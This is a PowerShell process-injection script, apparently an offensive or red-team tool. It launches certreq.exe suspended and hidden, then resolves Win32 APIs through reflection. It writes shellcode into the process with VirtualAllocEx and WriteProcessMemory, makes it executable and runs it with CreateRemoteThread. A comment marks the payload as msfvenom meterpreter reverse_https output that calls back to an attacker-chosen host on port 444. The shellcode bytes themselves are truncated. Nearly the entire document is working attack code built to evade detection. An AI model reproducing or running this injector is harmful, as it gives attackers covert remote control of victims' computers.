function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    # Return the address of the function
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TypeBuilder.CreateType()
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
 
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}
 
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
    public int length;
    public IntPtr lpSecurityDescriptor;
    public bool bInheritHandle;
}

public class coffee
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes, 
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags, 
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation);
}
"@

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IP LPORT=444 -p powershell
[Byte[]] $b = 0xfc, ....

# CRT PRCSs
$StartupInfo = New-Object STARTUPINFO
$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
 
$ProcessInfo = New-Object PROCESS_INFORMATION
$SecAttr = New-Object SECURITY_ATTRIBUTES
$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)

[coffee]::CreateProcess("C:\\windows\\system32\\certreq.exe", "", [ref] $SecAttr, [ref] $SecAttr, $false,
0x08000000 -bor 0x00000004, [IntPtr]::Zero, "C:\\Windows\\system32", [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
$processID = $ProcessInfo.dwProcessId

# GT HNDLNG
$OpenProcAddr = Get-ProcAddress kernel32.dll OpenProcess
$OpenProcDelegate = Get-DelegateType @([UInt32], [bool], [int]) ([IntPtr])
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcAddr,
$OpenProcDelegate)
$hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $processID)

# ALLC
$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [Uint32], [Uint32]) ([IntPtr])
$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr,
$VirtualAllocExDelegate)
$addr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, [Uint32]$b.Length, 0x00001000 -bor 0x00002000,
0x40)

# WRT
$WriteProcMemAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
$WriteProcMemDelegate = Get-DelegateType @([IntPtr], [IntPtr], [byte[]], [Int32],
[IntPtr].MakeByRefType()) ([bool])
$WriteProcMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcMemAddr,
$WriteProcMemDelegate)
$written = [IntPtr]::Zero
$stat = $WriteProcMem.Invoke($hProcess, $addr, $b, [int32]$b.Length, [ref]$written)

# RST PERM
$VirtualProtecExAddr = Get-ProcAddress kernel32.dll VirtualProtectEx
$VirtualProtecExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UintPtr], [Uint32],
[Uint32].MakeByRefType()) ([bool])
$VirtualProtecEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtecExAddr,
$VirtualProtecExDelegate)
$oldPerm = $null;
$stat = $VirtualProtecEx.Invoke($hProcess, $addr, [UintPtr]::new($b.Length), 0x20, [ref]$oldPerm)

# RN
$CreateRemThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
$CreateRemThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [IntPtr], [IntPtr],
[Uint32], [IntPtr].MakeByRefType()) ([IntPtr])
$CreateRemThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemThreadAddr,
$CreateRemThreadDelegate)
$threadId = [IntPtr]::Zero
$stat = $CreateRemThread.Invoke($hProcess, [intPtr]::Zero, 0, $addr, [intPtr]::Zero, 0,
[ref]$threadId)

Write-Host $threadId
